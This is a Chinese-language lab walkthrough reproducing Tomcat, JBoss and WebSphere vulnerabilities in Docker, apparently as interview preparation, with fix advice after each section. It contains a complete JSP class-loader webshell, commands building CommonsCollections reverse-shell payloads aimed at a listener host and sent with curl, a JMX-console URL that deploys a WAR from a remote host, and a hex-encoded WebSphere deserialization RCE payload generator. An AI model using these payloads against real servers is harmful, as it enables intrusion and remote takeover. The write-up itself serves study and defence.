面试的时候会经常问关于中间件的漏洞，这里做一下漏洞的复现巩固一下

在虚拟机中安装docker环境具体就不演示了[Vulhub - Docker-Compose file for vulnerability
environment](https://vulhub.org/#/docs/install-docker-one-click/)

## Tomcat漏洞

### Tomcat 任意文件写入（CVE-2017-12615）

影响范围： Tomcat 7.0.0-7.0.81（默认配置）

测试环境：Apache Tomcat v8.5.39

漏洞本质：Tomcat配置文件/conf/web.xml
配置了可写（readonly=false），导致我们可以往服务器写文件。如果配置了默认[servlet](https://so.csdn.net/so/search?q=servlet&spm=1001.2101.3001.7020)，则在9.0.1（Beta），8.5.23，8.0.47和7.0.82之前的所有Tomcat版本都包含所有操作系统上的潜在危险的CVE-2017-12615漏洞

docker打开环境

![1645842869_621991b5e2ac0d1ca634b.png!small?1645842869350](https://image.3001.net/images/20220226/1645842869_621991b5e2ac0d1ca634b.png!small?1645842869350)

    
    
    docker ps
    docker exec -ti 9eb90787a80f bash
    cat conf/web.xml | grep readonly
    

![1645845311_62199b3f8b87430066ca2.png!small?1645845310828](https://image.3001.net/images/20220226/1645845311_62199b3f8b87430066ca2.png!small?1645845310828)

可以看到Tomcat配置文件/conf/web.xml 配置了可写（readonly=false）

抓个包，修改一下数据包改成put，写入一个jsp文件（因为tomcat不能解析php文件）

可以看到成功写入任意文件

![1645884018_621a32727adccf9608dc5.png!small?1645884018714](https://image.3001.net/images/20220226/1645884018_621a32727adccf9608dc5.png!small?1645884018714)

![1645884047_621a328f087e0f19d1e4a.png!small?1645884047208](https://image.3001.net/images/20220226/1645884047_621a328f087e0f19d1e4a.png!small?1645884047208)

既然可以写入任意文件，那也可以写入后门来getshell

payload

    
    
    <%!
        class U extends ClassLoader {
            U(ClassLoader c) {
                super(c);
            }
            public Class g(byte[] b) {
                return super.defineClass(b, 0, b.length);
            }
        }
     
        public byte[] base64Decode(String str) throws Exception {
            try {
                Class clazz = Class.forName("sun.misc.BASE64Decoder");
                return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
            } catch (Exception e) {
                Class clazz = Class.forName("java.util.Base64");
                Object decoder = clazz.getMethod("getDecoder").invoke(null);
                return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
            }
        }
    %>
    <%
        String cls = request.getParameter("passwd");
        if (cls != null) {
            new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
        }
    %>
    

![1645884539_621a347b8154c7639fa0e.png!small?1645884539746](https://image.3001.net/images/20220226/1645884539_621a347b8154c7639fa0e.png!small?1645884539746)

修复建议：将readonly=true，默认为true。

### Tomcat 远程代码执行（CVE-2019-0232）

影响范围：9.0.0.M1 ~ 9.0.17 , 8.5.0 ~ 8.5.39 ， 7.0.0 ~ 7.0.93

测试环境：Apache Tomcat v8.5.39[apache
V8.5.39](https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.39/bin/apache-tomcat-8.5.39-windows-x86.zip)、windows

漏洞本质：CVE-2019-0232漏洞是由于Tomcat
CGI将命令行参数传递给Windows程序的方式存在错误，使得CHIServler被命令注入影响。该漏洞只影响Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数。但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。

修改 \conf\web.xml配置文件

376行和419行取消注释并添加参数

![1645888889_621a4579bb1320d5c1405.png!small?1645888889912](https://image.3001.net/images/20220226/1645888889_621a4579bb1320d5c1405.png!small?1645888889912)

![1645888946_621a45b26f2e172a3c4f2.png!small?1645888946563](https://image.3001.net/images/20220226/1645888946_621a45b26f2e172a3c4f2.png!small?1645888946563)

    
    
    <init-param>
    <param-name>debug</param-name>
    <param-value>0</param-value>
    </init-param>
    <init-param>
    <param-name>executable</param-name>
    <param-value></param-value>
    </init-param>
    

![1645889077_621a463555aad886e2118.png!small?1645889077496](https://image.3001.net/images/20220226/1645889077_621a463555aad886e2118.png!small?1645889077496)

![1645889168_621a4690209f174e1f72e.png!small?1645889168328](https://image.3001.net/images/20220226/1645889168_621a4690209f174e1f72e.png!small?1645889168328)

在content.xml 19行处添加privileged属性为true

![1645889272_621a46f8917d6a2512d94.png!small?1645889272722](https://image.3001.net/images/20220226/1645889272_621a46f8917d6a2512d94.png!small?1645889272722)

在Tomcat\webapps\ROOT\WEB-INF新建cgi目录，并创建xxx.bat文件，名字内容任意。

bin目录下startup.bat 开启tomcat服务

访问http://your-ip/cgi-bin/test.bat?&C:/Windows/System32/net+user,执行net user 命令

（net命令的路径要写全，直接写net user，Tomcat控制台会提示net不是内部命令，也不是可运行的程序，另
必须使用+号连接，使用空格，%2B都会执行失败，控制台报错。）

这里我是失败了,，返回了500，有懂的师傅可以一起讨论一下

![1646487965_6223699d22c489ca0507f.png!small?1646487965331](https://image.3001.net/images/20220305/1646487965_6223699d22c489ca0507f.png!small?1646487965331)

修复建议：这个默认是关闭的，如果打开了请关闭，若需使用请升级版本。

### Tomcat 文件包含漏洞（CVE-2020-1938）

影响范围：7 ~ 7.0.099 、8 ~ 8.5.50 、9 ~ 9.0.30

测试环境：Apache Tomcat v9.0.30

漏洞本质：由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有
webapp 目录下的任意文件,例如可以读取 webapp
配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。

![1645948324_621b2da4bf5898907a7d8.png!small?1645948324022](https://image.3001.net/images/20220227/1645948324_621b2da4bf5898907a7d8.png!small?1645948324022)

nmap扫到还有一个AJP端口8009正在监听

使用工具读取 web.xml文件

[YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi: Tomcat-Ajp协议文件读取漏洞
(github.com)](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)

![1645949320_621b3188dcbfcea289ec4.png!small?1645949320279](https://image.3001.net/images/20220227/1645949320_621b3188dcbfcea289ec4.png!small?1645949320279)

尝试了一下getshell，放了一个jsp后门，但是不能rce，直接把文件都读出来了。

修复建议：将 Tomcat 升级到 9.0.31、8.5.51或 7.0.100
版本进行漏洞修复。如无法立即进行版本更新、或者是更老版本的用户，建议直接关闭AJPConnector，或将其监听地址改为仅监听本机localhost。

### Tomcat + 弱口令 && 后台getshell漏洞

环境：Apache Tomcat/7.0.94

在conf/tomcat-users.xml文件中配置用户的权限和一个弱口令tomcat/tomcat：

Tomcat 7+的权限有：

  * manager（后台管理）

    * manager-gui拥有html页面权限

    * manager-status拥有查看status的权限

    * manager-script拥有text接口权限（包括status权限）

    * manager-jmx拥有jmx权限（包括status权限）

  * host-manager（虚拟主机管理）

    * admin-gui拥有html页面权限

    * admin-script拥有text接口权限

    
    
    <tomcat-users>
    <role rolename="manager-gui"/>
    <role rolename="manager-script"/>
    <role rolename="manager-jmx"/>
    <role rolename="manager-status"/>
    <role rolename="admin-gui"/>
    <role rolename="admin-script"/>
    <user username="tomcat" password="tomcat" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
    </tomcat-users>
    

![1645952048_621b3c30ce805379f664c.png!small?1645952048093](https://image.3001.net/images/20220227/1645952048_621b3c30ce805379f664c.png!small?1645952048093)

正常安装的情况下，tomcat7.0.94中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。

访问 http://127.0.0.1:8080/manager/html ,输入弱口令tomcat/tomcat进入后台（弱口令可以进行爆破）

![1645953217_621b40c17f67d08ad6e42.png!small?1645953216936](https://image.3001.net/images/20220227/1645953217_621b40c17f67d08ad6e42.png!small?1645953216936)

写一个jsp的木马（见上），然后打包成war包，上传的war会被自动解压部署

jar -cvf shell.war shell.jsp

    
    
    war包是用来进行Web开发时一个网站项目下的所有代码,包括前台HTML/CSS/JS代码,以及后台JavaWeb的代码。
    当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布则也会打包成War包进行发布。War包
    可以放在Tomcat下的webapps或word目录,当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。
    

![1645960449_621b5d01dbf1bad3441da.png!small?1645960449052](https://image.3001.net/images/20220227/1645960449_621b5d01dbf1bad3441da.png!small?1645960449052)

可以看到已经上传上去了，接着使用蚁剑连接后门[127.0.0.1:8080/shell/shell.jsp](http://127.0.0.1:8080/shell/shell.jsp)

![1645960544_621b5d6081743582770ac.png!small?1645960543637](https://image.3001.net/images/20220227/1645960544_621b5d6081743582770ac.png!small?1645960543637)

上传的位置在webapps里

![1645960622_621b5dae312c12d2b48ed.png!small?1645960621326](https://image.3001.net/images/20220227/1645960622_621b5dae312c12d2b48ed.png!small?1645960621326)

修复建议：取消manager/html功能。若要使用，manager页面应只允许本地IP访问

## JBoss漏洞

### JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）

漏洞原理：该漏洞位于JBoss的HttpInvoker组件中的 ReadOnlyAccessFilter
过滤器中，其doFilter方法在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列化数据流进行反序列化，导致攻击者可以通过精心设计的序列化数据来执行任意代码。但有安全研究者发现JBOSSAS
6.x也受该漏洞影响，攻击者利用该漏洞无需用户验证在系统上执行任意命令，获得服务器的控制权。

该漏洞出现在`/invoker/readonly`请求中，服务器将用户提交的POST内容进行了Java反序列化：

使用docker搭建漏洞环境

访问 /invoker/readonly 返回500，说明页面存在，此页面存在反序列化漏洞。

![1645962967_621b66d7c8918091641e8.png!small?1645962966999](https://image.3001.net/images/20220227/1645962967_621b66d7c8918091641e8.png!small?1645962966999)

使用工具[JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC)进行攻击

首先使用nc建立一个监听，然后使用工具

    
    
    #生成ReverseShellCommonsCollectionsHashMap.class
    javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
    
    #生成ReverseShellCommonsCollectionsHashMap.ser
    java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.0.108:9999（nc监听端口）
    
    #访问利用 
    curl http://127.0.0.1:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
    

![1645964994_621b6ec26a4505ffbeea9.png!small?1645964994683](https://image.3001.net/images/20220227/1645964994_621b6ec26a4505ffbeea9.png!small?1645964994683)

直接获取到root权限

修复建议：

  * 删除http-invoker.sar组件，路径如下jboss-6.1.0.Final\server\default\deploy\http-invoker.sar

  * 更新JBoss

### JBoss <=4.x JBossMQJMS 反序列化漏洞（CVE-2017-7504）

漏洞原理：JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over
[HTTP](https://so.csdn.net/so/search?q=HTTP&spm=1001.2101.3001.7020)Invocation
Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。

访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL，说明页面存在，此页面存在反序列化漏洞

![1645974894_621b956eb7970c9474978.png!small?1645974894873](https://image.3001.net/images/20220227/1645974894_621b956eb7970c9474978.png!small?1645974894873)

因为都是反序列化漏洞，攻击时方式和之前一样，先生成一个序列化数据，然后通过包发送，生成方式一样

    
    
    #生成ReverseShellCommonsCollectionsHashMap.class
    javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
    
    #生成ReverseShellCommonsCollectionsHashMap.ser 
    java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.0.108:9999（nc监听端口）
    
    #访问利用 
    curl http://127.0.0.1:8080/jbossmq-httpil/HTTPServerILServlet  --data-binary @ReverseShellCommonsCollectionsHashMap.ser
    

![1646031097_621c70f9206e090fff97a.png!small?1646031097575](https://image.3001.net/images/20220228/1646031097_621c70f9206e090fff97a.png!small?1646031097575)

### JBoss JMXInvokerServlet 反序列化漏洞

访问 /invoker/JMXInvokerServlet

![1646031960_621c745883df489be4b6f.png!small?1646031960709](https://image.3001.net/images/20220228/1646031960_621c745883df489be4b6f.png!small?1646031960709)

说明接口开放，此接口存在反序列化漏洞

同样这里直接利用CVE-2017-12149生成的ser，发送到 /invoker/JMXInvokerServlet接口中。

    
    
    curl http://127.0.0.1:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser
    

![1646032584_621c76c8d59fff3b90671.png!small?1646032585179](https://image.3001.net/images/20220228/1646032584_621c76c8d59fff3b90671.png!small?1646032585179)

### JBoss EJBInvokerServlet 反序列化漏洞

访问 /invoker/EJBInvokerServlet

![1646055654_621cd0e63903d49c605c7.png!small?1646055654312](https://image.3001.net/images/20220228/1646055654_621cd0e63903d49c605c7.png!small?1646055654312)

说明接口开放，此接口存在反序列化漏洞

同样这里直接利用CVE-2017-12149生成的ser，发送到 /invoker/EJBInvokerServlet接口中。

    
    
    curl http://127.0.0.1:8080/invoker/EJBInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser
    

### Administration Console 弱口令 && 后台getshell漏洞

在后台管理控制台爆破密码http://127.0.0.1:8080/admin-console/index.seam

![1646054970_621cce3ad6b9c7033efe8.png!small?1646054970831](https://image.3001.net/images/20220228/1646054970_621cce3ad6b9c7033efe8.png!small?1646054970831)

登陆后台后上传war包，和tomcat的漏洞同理，写好一个jsp木马打包成war文件

jar -cvf shell.war shell.jsp

![1646055121_621cced11e48209cda9d6.png!small?1646055121162](https://image.3001.net/images/20220228/1646055121_621cced11e48209cda9d6.png!small?1646055121162)

![1646055334_621ccfa6ab006c09ca50b.png!small?1646055335000](https://image.3001.net/images/20220228/1646055334_621ccfa6ab006c09ca50b.png!small?1646055335000)

蚁剑连接http://127.0.0.1:8080/shell/shell.jsp

![1646055420_621ccffc3b79be234697d.png!small?1646055420270](https://image.3001.net/images/20220228/1646055420_621ccffc3b79be234697d.png!small?1646055420270)

修复建议：

  * 1\. 修改密码 C:\jboss-6.1.0.Final\server\default\conf\props\jmx-console-users.properties

  * 2\. 删除Administration Console页面。  
JBoss版本>=6.0，admin-console页面路径为： C:\jboss-6.1.0.Final\common\deploy\admin-console.war  
6.0之前的版本，路径为C:\jboss-4.2.3\server\default\deploy\management\console-mgr.sar\web-console.war

### JMX Console未授权访问

JMXConsole默认存在未授权访问，直接点击JBoss主页中的JMXConsole链接进入JMXConsole页面。http://127.0.0.1:8080/jmx-console/

在JMXConsole页面点击jboss.system链接，在Jboss.system页面中点击service=MainDeployer

![1646058266_621cdb1adf668960b546b.png!small?1646058266917](https://image.3001.net/images/20220228/1646058266_621cdb1adf668960b546b.png!small?1646058266917)

进入service=MainDeployer页面之后，找到methodIndex为17 or 19的deploy 填写远程war包地址进行远程部署。

![1646059927_621ce19775bbacc9c79de.png!small?1646059927476](https://image.3001.net/images/20220228/1646059927_621ce19775bbacc9c79de.png!small?1646059927476)

(这里点了invoke会跳到500，所以我直接在url构造上传war包)[http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://192.168.0.108/shell.war](http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://192.168.0.108/shell.war)

![1646064271_621cf28f7ef4107bc3d37.png!small?1646064271432](https://image.3001.net/images/20220301/1646064271_621cf28f7ef4107bc3d37.png!small?1646064271432)

显示这样就代表上传成功

###
![1646055420_621ccffc3b79be234697d.png!small?1646055420270](https://image.3001.net/images/20220228/1646055420_621ccffc3b79be234697d.png!small?1646055420270)

修复建议：

  * 增加密码措施，防止未授权访问。

  * 删除JMXConsole,后重启JBoss C:\jboss-6.1.0.Final\common\deploy\jmx-console.war

## WebSphere

WebSphere® Application Server
加速交付新应用程序和服务，它可以通过快速交付创新的应用程序来帮助企业提供丰富的用户体验。从基于开放标准的丰富的编程模型中进行选择，以便更好地协调项目需求与编程模型功能和开发人员技能。

同样docker模拟WebSphere7环境

    
    
    docker search WebSphere7
    docker pull iscrosales/websphere7
    docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7
    

### Java反序列化(CVE-2015-7450）

访问8880端口，出现如下界面，则可能存在Java反序列化漏洞

![1646470959_6223272fb3ed026daab31.png!small?1646470960119](https://image.3001.net/images/20220305/1646470959_6223272fb3ed026daab31.png!small?1646470960119)

首先利用脚本加密想要执行的命令

    
    
    import base64
    from binascii import unhexlify
     
    command = "要执行的命令"
    serObj = unhexlify("ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400")
    serObj += (chr(len(command)) + command).encode('ascii')
    serObj += unhexlify("740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A")
    serObjB64 = base64.b64encode(serObj).decode()
    print(serObjB64)
    

访问8880，并抓包，然后替换如下Payload进行复现。将脚本输出的serObjB64，替换到上面Payload中的params节点，其余无需改变。

    
    
    （不知道为什么m.9是敏感词汇，payload发不出来，参考一下别人的文章）[应用漏洞]CVE-2015-7450 WebSphere命令执行_不忘初心，护天下安全！-CSDN博客
    

这里我的将touch /tmp/1_Ry命令加密拼接到payload中，放包

![1646479261_6223479d4e9c97264f760.png!small?1646479261623](https://image.3001.net/images/20220305/1646479261_6223479d4e9c97264f760.png!small?1646479261623)

或者利用python脚本验证该漏洞

[java-deserialization-exploits/websphere_rce.py at main · Coalfire-Research/java-deserialization-exploits
(github.com)](https://github.com/Coalfire-Research/java-deserialization-exploits/blob/main/WebSphere/websphere_rce.py)

![1646480523_62234c8b4044ce083e23c.png!small](https://image.3001.net/images/20220305/1646480523_62234c8b4044ce083e23c.png!small)

后面试了一下反弹shell或者写入后门，好像都执行不了，有大佬知道这个漏洞在实战中的利用吗

修复建议：

  * 7.x版本已不提供支持，因此选择升级版本。

  * 若版本还在IBM支持范围，可选择打补丁。

### 弱口令 && 后台Getshell

在6.x至7.0版本，后台登陆只需要输入 admin作为用户标识，无需密码，即可登陆后台。

<http://127.0.0.1:9060/ibm/console/logon.jsp>

<https://127.0.0.1:9043/ibm/console/logon.jsp>

![1646484615_62235c874da7c212089b4.png!small?1646484615553](https://image.3001.net/images/20220305/1646484615_62235c874da7c212089b4.png!small?1646484615553)

上传war包后一直点下一步直到contex Root,然后继续下一步

![1646484686_62235cce470daded58e28.png!small?1646484686682](https://image.3001.net/images/20220305/1646484686_62235cce470daded58e28.png!small?1646484686682)

![1646484779_62235d2b20104726a82cb.png!small?1646484779342](https://image.3001.net/images/20220305/1646484779_62235d2b20104726a82cb.png!small?1646484779342)

![1646485081_62235e59ea2fc67020f03.png!small?1646485082239](https://image.3001.net/images/20220305/1646485081_62235e59ea2fc67020f03.png!small?1646485082239)

![1646485131_62235e8bb67be543c35a4.png!small?1646485131959](https://image.3001.net/images/20220305/1646485131_62235e8bb67be543c35a4.png!small?1646485131959)

注意是9080端口，协议是http

![1646485335_62235f574b788a3922ee1.png!small?1646485335508](https://image.3001.net/images/20220305/1646485335_62235f574b788a3922ee1.png!small?1646485335508)

修复建议

  * 设置密码。

